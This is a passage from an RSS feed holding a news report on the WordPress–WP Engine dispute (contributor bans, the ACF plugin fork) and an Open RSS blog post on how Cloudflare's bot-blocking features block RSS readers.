WP&nbsp;Engine, but just how far does "<q>financially and
otherwise</q>" go? Does this apply, for example, to employees of the
many companies that host their clients' web sites on WP&nbsp;Engine?
Customers with a subscription to one of WP&nbsp;Engine's services? A
number of contributors have sought answers about this
policy in the WordPress Slack, with disappointing results. A handful
have reported being banned from the Slack instance after these conversations, either due to
pressing for answers or questioning Mullenweg's leadership.</p>

<p>Javier Casares <a href="https://twitter.com/JavierCasares/status/1843963052183433331">shared</a> that his account was deactivated after he asked a series
of questions in <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728463928352389">a Slack
thread</a> started by Colin Stewart. (Note that one needs to have a
WordPress.org account, and be signed in, to request an account on the
WordPress Slack.) In the thread, Mullenweg said that the value of the
checkbox is not stored, but refused to clarify what qualifies as an
affiliation with WP&nbsp;Engine. He advised those who had questions to
"<q>consult a lawyer</q>".</p>

<!-- middle-ad -->

<p>Casares said that most people agree that WP&nbsp;Engine should
contribute more to WordPress, but that using WordPress.org as part of
the battle is counterproductive. He asked on Slack that the language be
changed to indicate a user does not <em>work</em> for WP&nbsp;Engine,
but that suggestion was not taken up.</p>

<h4>Pick a side</h4>

<p>Another participant, Terence Eden, <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728557220371169?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">asked
on Slack</a>
whether he could send pull requests via GitHub if he was affiliated
with WP&nbsp;Engine. After an exchange with Mullenweg that was less
than helpful, Eden replied:</p>

<blockquote>
I've never seen anyone spread so much FUD about their own project
before. I started out as sympathetic to your cause against WP
Engine. But your behaviour has driven me - and many other good people
- away.
</blockquote>

<p>He later <a href="https://mastodon.social/@Edent/113287622359524228">reported on
Mastodon</a> that his account was deactivated.
Andrew Hutchings, a contributor who works on WordPress as part of
his work with the <a href="https://mariadb.org/">MariaDB
Foundation</a>, participated in the conversation
as well. He <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728468126620539?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">wondered
on Slack</a>
how many individual contributors could afford a lawyer to advise about
the checkbox and added "<q>I work for a different Foundation, one that
definitely cannot afford a lawyer for me to contribute.</q>" He <a href="https://linuxjedi.co.uk/my-wordpress-slack-ban/">wrote</a> on
his blog about being banned and said that he just wanted to work on
the project:</p>

<blockquote>
I think I speak for many in the WordPress community / ecosystem when I
say that we don't want to take sides in this battle. We don't want to
be forced to take sides via a checkbox. We just want to get work done,
to improve WordPress for everyone.
</blockquote>

<p>That may not be an option. During the
checkbox discussion in the #meta Slack channel Alex Sirota <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466624103039?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a>:
"<q>Do you not understand what is happening here? It's pretty simple
in my opinion: you have to take a side.</q>" Stewart <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466840305579?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a> that if that
was the intention, then Mullenweg could say so himself. Shortly after,
Mullenweg <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466945131879?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a>,
"<q>I want you all to be informed and involved. Not to stay on the
sidelines.</q>" Sirota's account has also been deactivated now, though it is not clear
whether he was banned or deactivated the account himself.</p>

<p>Mullenweg had also asked Automattic employees to pick a side, shortly
after banning WP&nbsp;Engine from WordPress.org. He <a href="https://ma.tt/2024/10/alignment/">wrote</a> on October&nbsp;3
that Automattic had extended an "<q>Alignment Offer</q>" to its
employees. The company provided a buyout package of $30,000 or six
months of salary (whichever was higher) to employees who wanted to
leave because they disagreed with Mullenweg's actions. Employees who
accepted the buyout were immediately terminated and are not eligible
for rehire. According to the post, 159&nbsp;people⁠—⁠8.4% of the
company⁠—⁠accepted the offer.</p>

<h4>Advanced Custom Fields</h4>

<p>WordPress's popularity has a lot to do with its plugins and themes.
A vanilla WordPress installation is missing a lot of
features that one might want or need to run a web site: backups,
commerce features, statistics, contact forms, search-engine
optimization (SEO), managing URL redirects, or adding additional
content types to WordPress.</p> 

<p>A large ecosystem has sprung up around WordPress to offer services
via those plugins, paid versions of plugins with additional
functionality, and paid themes to simplify site design. In turn, that
helps solidify WordPress's place as the most popular content-management
system (CMS) on the web.</p> 

<p>WP&nbsp;Engine produces popular plugin called <a href="https://www.advancedcustomfields.com/">Advanced Custom
Fields</a> (ACF), which has more than two million installs through
WordPress.org. It allows developers to add <a href="https://www.advancedcustomfields.com/resources/getting-started-with-acf/#creating-fields">extra content
fields</a> (called custom fields) to WordPress's edit screens. This
might be used, for example, as part of adding a <a href="https://www.advancedcustomfields.com/resources/date-picker/">date
picker</a> or an <a href="https://www.advancedcustomfields.com/resources/gallery/">interface
to create photo galleries</a> for a site. ACF is, in turn, used by or
in conjunction with <a href="https://wordpress.org/plugins/search/Advanced+Custom+Fields/">a
large number</a> of other WordPress plugins such as <a href="https://wordpress.org/plugins/advanced-forms/">Advanced Forms
for ACF</a> and <a href="https://wpml.org/documentation/related-projects/translate-sites-built-with-acf/">WPML</a>
for translating WordPress sites.</p> 

<p>The base ACF plugin is free, but it also has a <a href="https://www.advancedcustomfields.com/pro/#pricing-table">paid
version</a> ("ACF Pro") with a yearly subscription. Both are available
under the GPLv2, but users must pay for access to updates on the Pro
version and those come directly from WP&nbsp;Engine.</p>

<p>On September&nbsp;28, Mullenweg <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727501240087269">asked
on Slack</a> whether ACF&nbsp;Pro should be included in <a href="https://solidwp.com/blog/wordpress-core/">WordPress core</a>,
the components and functionality included in a default install of
WordPress. That drew mixed responses in the channel. Some users noted
that the ability to add custom fields was long overdue, but others had <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727505491855069?thread_ts=1727501240.087269&amp;cid=C02RQBWTW">qualms</a>
about taking over ACF&nbsp;Pro "<q>out of spite</q>". Richard Korthuis <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727505533162479?thread_ts=1727501240.087269&amp;cid=C02RQBWTW">asked</a>
what kind of message it would send to other developers who create paid
plugins: "<q>No matter what you think about WP Engine and the whole
dispute, this [sends] developers the wrong message and would prevent
future investments in new plugins</q>".</p>

<p>In a <a href="https://i.imgur.com/iN3MQkN.png">now-deleted
Tweet</a>, Automattic announced on October&nbsp;5, a Saturday, that it had "<q>responsibly disclosed
a vulnerability</q>" in ACF to WP&nbsp;Engine. The company did not provide
further details. John Blackbourn, the WordPress core security team
lead, <a href="https://twitter.com/johnbillion/status/1842627564453454049">said</a>
that Automattic had breached the <a href="https://kb.intigriti.com/en/articles/6054585-intigriti-code-of-conduct">Intigriti
Code of Conduct</a> by "<q>irresponsibly announcing</q>" the
vulnerability publicly. Intigriti is a company that runs bug-bounty programs
for companies, <a href="https://app.intigriti.com/programs/wpengine/wpengine/detail">including
WP&nbsp;Engine</a>.</p>

<p>On October&nbsp;7, WP&nbsp;Engine <a href="https://www.advancedcustomfields.com/blog/acf-6-3-8-security-release/">announced</a> a
security release of the plugin. The vulnerability itself seems to be
minor, according to the release notes. It is not a flaw that can be
exploited remotely and it only impacts "<q>the unlikely
scenario</q>" where a user with administrative privileges tries to
attack other administrative users, or tries to gain super-admin
privileges on a multi-site installation of WordPress. So far few other
details on the vulnerability beyond that have been provided. Another <a href="https://lwn.net/Articles/967192/">XZ&nbsp;backdoor</a> it is not.</p>

<p>Because its
developers are now blocked from WordPress.org, WP&nbsp;Engine had to <a href="https://x.com/wp_acf/status/1843376378210857441">provide its fix
to the WordPress Security team</a> to have it uploaded to the plugin
directory. There are also <a href="https://www.advancedcustomfields.com/blog/installing-and-upgrading-to-the-latest-version-of-acf/">instructions</a>
on updating the plugin manually to receive updates directly from WP&nbsp;Engine.</p>

<h4>ACF fork</h4>

<p>Mullenweg made an <a href="https://wordpress.org/news/2024/10/secure-custom-fields/">announcement</a>
on October&nbsp;12, another Saturday, "<q>on behalf of the <a href="https://wordpress.org/about/security/">WordPress
security team</a></q>" that ACF was being forked as <a href="https://wordpress.org/plugins/advanced-custom-fields/">Secure Custom
Fields</a> (SCF) under <a href="https://github.com/wordpress/wporg-plugin-guidelines/blob/trunk/guideline-18.md">point&nbsp;18</a>
of the <a href="https://github.com/WordPress/wporg-plugin-guidelines/tree/trunk?tab=readme-ov-file#table-of-contents">plugin
directory guidelines</a>. That part of the guidelines states, in part,
that WordPress.org may "<q>remove developer access to a plugin in lieu
of a new, active, developer</q>" and "<q>make changes to a plugin,
without developer consent, in the interest of public
safety</q>". According to the post this move was "<q>a rare and
unusual situation brought on by WP Engine's legal attacks</q>".</p>

<p>Automattic has not merely forked the ACF code and made it available
under a new name to compete with WP&nbsp;Engine. That might raise a
few eyebrows, but it would probably be considered fair game by most
observers.</p>

<p>Instead, it has forked the code and taken over the plugin's entry,
including all of its reviews, in the WordPress.org catalog. The new
plugin is being substituted in place of ACF for all of the users who have
installed it previously. According to the announcement on
WordPress.org, sites that auto-update plugins will receive the SCF
plugin automatically. Some site owners may be unaware that the plugin
has been silently replaced. According to a <a href="https://news.ycombinator.com/item?id=41833808">comment</a> by
Mullenweg on Hacker News on October&nbsp;14, there have already
been 225k downloads of the new plugin, and he estimated "<q>at least 60%
of the sites with auto-upgrade on and using .org for updates</q>" have
been moved to the fork.</p>

<p>This is not the first time a company has taken control of a package
distributed through a central repository, though it is rare. The <a href="https://lwn.net/Articles/681410/">left-pad
incident</a> in 2016, for example, saw <a href="https://www.npmjs.com/">npm,
Inc.</a> restore left-pad to the Node.js package
repository after its developer, Azer Koçulu, removed it. That move, however, was
intended to reduce disruption to the Node.js ecosystem: the removal had
broken builds for thousands of projects that had included the package,
and Koçulu had effectively abandoned it.</p>

<p>The takeover of ACF's place in the WordPress directory, on the
other hand, is a punitive move by Automattic against another company
that reaches beyond WordPress.org's infrastructure into millions of
WordPress installs. Web developer Charles Fulton <a href="https://blog.goodbyeplease.com/2024/10/12/The-call-is-coming-from-inside-the-house/">wrote</a>
about the incident and said that this is "<q>a profoundly destabilizing action for the WordPress
plugin ecosystem</q>"; he wondered if he needed to worry about updates
to core WordPress that might interfere with ACF Pro.</p>

<h4>WPGraphQL brought into the fold</h4>

<p>Users of ACF Pro that depend on the <a href="https://www.wpgraphql.com/">WPGraphQL</a> and <a href="https://acf.wpgraphql.com/">WPGraphQL for Advanced Custom
Fields</a> plugins may have real cause to be concerned that Automattic
will look to break compatibility for ACF. WPGraphQL
provides a <a href="https://graphql.org/">GraphQL</a>
schema and API for WordPress sites and is a popular plugin to
use in conjunction with ACF. Jason Bahl, the maintainer of the  plugin, <a href="https://www.wpgraphql.com/2024/10/07/wpgraphql-becomes-a-canonical-plugin-my-move-to-automattic">announced</a>
on October&nbsp;7 that he was leaving WP&nbsp;Engine to join
Automattic. Additionally, he said that WPGraphQL is becoming a
"<q>canonical plugin</q>" for WordPress.</p>

<p>The concept of canonical plugins is
loosely defined, but Mullenweg <a href="https://make.wordpress.org/core/2022/09/11/canonical-plugins-revisited/">described
them</a> in 2022 as official plugins that are the first choice
for a type of functionality, but too niche to be included in the core
distribution. With WPGraphQL development under Automattic's roof, it
seems unlikely that compatibility with ACF will be a priority.</p>

<p>Scott Kingsley Clark, who has been involved in a project to bring a
fields API into the WordPress core, <a href="https://make.wordpress.org/core/2024/10/13/fields-api-team-seeking-new-leadership/">announced</a>
on October&nbsp;13 that he was stepping down from contributing to
WordPress core. The <a href="https://github.com/sc0ttkclark/wordpress-fields-api">fields API
project</a> on GitHub has been archived with a goodbye notice that
states that it pains him to stop but that he is "<q>done making excuses for
Matt's actions and will not associate myself with core any
longer</q>". He <a href="https://scottodon.com/@skc/113297201274378086">added</a>
on Mastodon.social that he was going to remain part of the WordPress
community overall, and continue working on the <a href="https://wordpress.org/plugins/pods/">Pods</a> plugin.</p>

<h4>What next?</h4>

<p>What happens next, what Mullenweg will <em>do</em> next, is
anyone's guess. Mullenweg's vendetta against WP&nbsp;Engine has
spilled over into the community in a way that can't easily be
ignored or avoided. His leadership of the project is being repeatedly
called into question by contributors, users, and outside
observers. That will spill over, if it hasn't already, into the wider
commercial ecosystem and have serious consequences for plugin
creators, creative agencies, and hosting providers who have invested a
lot into WordPress.</p>

<p>More contributors are likely to step away, whether they do so
publicly or simply drift away and find other things to do with their
time. Quite a few users on social networks have commented that they
would no longer recommend WordPress and are looking for
alternatives. A fork, in addition to <a href="https://lwn.net/Articles/992219/">ClassicPress</a>, seems almost
inevitable.</p>

<p>There is a legitimate conversation to be had, or continued, about the
commercialization of open-source projects by companies that do little
to sustain open-source software but reap its benefits and pull revenue
away from the companies that <em>do</em> put in the work. That conversation has
been completely eclipsed by Mullenweg's actions to punish WP&nbsp;Engine.</p>

<h4>Mullenweg the "mad king"</h4>

<p>Armin Ronacher, creator of the <a href="https://flask.palletsprojects.com/en/3.0.x/">Flask</a> web
framework for Python and participant in launching the <a href="https://lwn.net/Articles/993073/">Open Source Pledge</a>, has some <a href="https://lucumr.pocoo.org/2024/10/14/mixing-oss-and-money/">interesting
thoughts</a> on the topic of mixing money and open source in light of
the ongoing WordPress crisis:</p>

<blockquote>
Is it a wise [idea] to mix Open Source and money? Maybe not. Yet I also
believe it's something that is just a reality we need to
navigate. Today there are some projects too small to get any funding
(xz) and there are projects large enough to find some way to sustain
by funneling money to it (Rails, WordPress).
</blockquote>

<p>He observes that he has seen too many
people in open source struggle "<q>one way or another</q>" as a direct
or indirect result of work in open source. He says Mullenweg, like
other creators of open-source projects, feels wronged by seeing others
find financial success from his project even though WordPress is
uncommonly successful "<q>in terms of impact, success, and financial
return for its creator</q>". Mullenweg's actions, Ronacher said,
"<q>have alienated many who would otherwise support him. He's turning into a 'mad
king'</q>".</p>

<p>That is deeply unfortunate, because the questions about sustainability
of open-source projects, and who profits from them versus who produces
them, are in need of addressing. Instead of having <em>that</em>
conversation, Mullenweg has put questions about governance,
centralized software distribution, and software supply chains at the forefront.</p>

<p>After decades of being a poster child for the goodness of open
source, WordPress is becoming a case study in the dangers of the
company-owned project model. Instead of being the safe choice,
WordPress is starting to be seen as the risky one—and that
perception may impact open source as a whole.</p>

<br clear="all">
               <br clear="all">
               <hr>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Using Cloudflare on your website could be blocking RSS users (457 pts)]]></title>
            <link>https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</link>
            <guid>41864632</guid>
            <pubDate>Wed, 16 Oct 2024 22:46:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users">https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</a>, See on <a href="https://news.ycombinator.com/item?id=41864632">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <article>
                        
                        <header>
                            <time datetime="2024-10-16T00:00:00.000Z">October 16, 2024</time>
                        </header>
                        <picture>
<source srcset="https://openrss.org/media/cloudflare-headline-image-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/cloudflare-headline-image.png" alt="Image of Cloudflare logo of what looks like a sun setting on a horizon with the words Cloudflare underneath in a super bold, dark gray font">
</picture>

<p>Many users prefer to use an RSS feed reader to stay up to date with the content on the websites they visit. But if you've enabled Cloudflare on your website, you're likely blocking these RSS users from accessing your website content without realizing it.</p>
<a id="the-cloudflare-features-that-block-rss-readers" href="#the-cloudflare-features-that-block-rss-readers"></a>
<p>In Cloudflare's dashboard, you'll find <a href="https://developers.cloudflare.com/waf/tools/">tools</a> designed to block bot traffic to your website. Particularly, the Bot Fight Mode and block all "AI scrapers and crawlers" options below. When enabled, these features end up blocking users who access your website through RSS readers, even though RSS readers are legitimate and aren't malicious bots.</p>
<figure>
<img src="https://openrss.org/media/cloudflare-bot-security-dashboard-detection-configuration.png" alt="An image of the Bot Fight Mode and AI Scrapers and Crawlers configuration toggles on Cloudflare's Security dashboard">
<figcaption>A screenshot of Cloudflare's Bot Fight Mode and block all "AI scrapers and crawlers" features that block RSS readers from accessing a website</figcaption>
</figure>

<a id="how-cloudflare-blocks-rss-readers-from-your-website" href="#how-cloudflare-blocks-rss-readers-from-your-website"></a>
<p>When enabling the tools, Cloudflare will evaluate each visit to your website and determine whether the visit is from an AI scraper or "bot" based on a <a href="https://developers.cloudflare.com/bots/concepts/bot-score">score</a> , which ironically Cloudflare uses AI to generate.</p>
<picture>
<source srcset="https://openrss.org/media/rss-readers-blocked-by-cloudflare-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/rss-readers-blocked-by-cloudflare.png" alt="Image of an RSS reader blocked by Cloudflare">
</picture>

<p>Then, when a user's RSS reader attempts to read your website, Cloudflare presents it with a number of <a href="https://developers.cloudflare.com/waf/reference/cloudflare-challenges/">challenges</a> that the reader would never be able to fulfill.</p>
<p>Here's an example of the Human Verification challenge that an RSS reader would be shown when it tries to visit your website. The challenge requires a human to solve and, because an RSS reader is not a human, it can never complete them.</p>
<picture>
<source srcset="https://openrss.org/media/cloudflare-human-verification-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/cloudflare-human-verification.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">
</picture>

<p>In other cases, Cloudflare will simply block the RSS reader from accessing your website without a reason.</p>
<img src="https://openrss.org/media/cloudflare-block.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">

<p>The only way to resolve when Cloudflare blocks an RSS reader from accessing your website is by contacting you directly and asking you to make a custom rule to unblock it. But Cloudflare shouldn't expect people to contact every owner of every Cloudflare website that blocks their RSS reader. And you shouldn't have to waste time logging into Cloudflare to add an exception every time they block an RSS reader, either.</p>
<a id="unblock-rss-readers-while-still-using-cloudflare" href="#unblock-rss-readers-while-still-using-cloudflare"></a>
<p>Even though Cloudflare blocks RSS readers from your website, you can whitelist RSS readers as a workaround. This would at least unblock RSS readers without having to turn off any security features that you may have already been enabled until Cloudflare better addresses the issue.</p>
<p>First, find the user agent of any blocked RSS reader in Cloudflare's analytics dashboard. The&nbsp;<code>User-Agent</code>&nbsp;of most good RSS readers usually include the name of the reader, it's URL, or a word like "RSS" or "feed" that makes it obvious that it's an RSS reader.</p>
<p>Once you've identified an RSS reader's user agent, you can&nbsp;<a href="https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-ips-in-allowlist/">create a custom</a>&nbsp;rule that explicitly whitelists and allows all traffic by the reader's IP address or by it's user agent string. Note that user agents can be disguised, so it's often better to whitelist the reader's IP address instead of the user agent. If you'd like to whitelist Open RSS, please&nbsp;<a href="https://openrss.org/contact">contact us</a>&nbsp;for the required information.</p>
<a id="cloudflare-needs-a-better-way-to-allow-rss-readers" href="#cloudflare-needs-a-better-way-to-allow-rss-readers"></a>
<p>Cloudflare offers a bot verification program to which RSS readers owners can manually apply to avoid being blocked by websites, but this program isn't guaranteed to work and it suffers from quite a few problems.</p>
<ul>
<li><p><strong>The verification process is flimsy</strong> — They're using a <a href="https://docs.google.com/forms/d/e/1FAIpQLSdqYNuULEypMnp4i5pROSc-uP6x65Xub9svD27mb8JChA_-XA/viewform">Google form</a> for applications to the program. Then after applying, no notification is sent that they're working on it or even received the application successfully (we've tried <a href="https://openrss.org/issue/144#202406210145">applying twice</a>), with no progress updates or expected timeframe for completion.</p>
</li>
<li><p><strong>Verified RSS readers are still being blocked</strong> — There are reports that RSS readers Cloudflare has verified as "good bots" are still being blocked from websites. If Cloudflare has successfully approved an RSS reader as a "good bot", it shouldn't be blocked or still require website owners to add any custom exception rules.</p>
</li>
<li><p><strong>Unblocking RSS readers across multiple websites is cumbersome</strong> — Cloudflare's only resolution to unblocking RSS readers is for the owners of the readers to contact each website owner directly and ask for an exception to be made. While that may work for one-off cases, this is unreasonable for RSS readers that have to access thousands of different Cloudflare-enabled websites each day. It's also overwhelming for website owners to configure exceptions for each and every RSS reader.</p>
</li>
</ul>
<p>To be clear, there's nothing wrong with using Cloudflare's security tools on your website to help deal with malicious AI bots, scrapers, and potential attacks. But Cloudflare needs to ensure that people who use RSS tools aren't blocked from accessing your website content, and make it easier to resolve when they are.</p>
 
    <small>
        <br>
        <center>❤</center>
        <em>
            Open RSS is a registered 501(c)(3) nonprofit headquartered in the
            District of Columbia, USA and funded only by voluntary donations of
            its users. If you enjoy using Open RSS, we'd be so grateful if you'd
            consider
            <a href="https://openrss.org/donate">donating</a> to help us grow and
            continue to provide you with a quality and reliable service.
        </em>
    </small>

                    </article>
                </div></div>]]></description>
        </item>
    </channel>
</rss>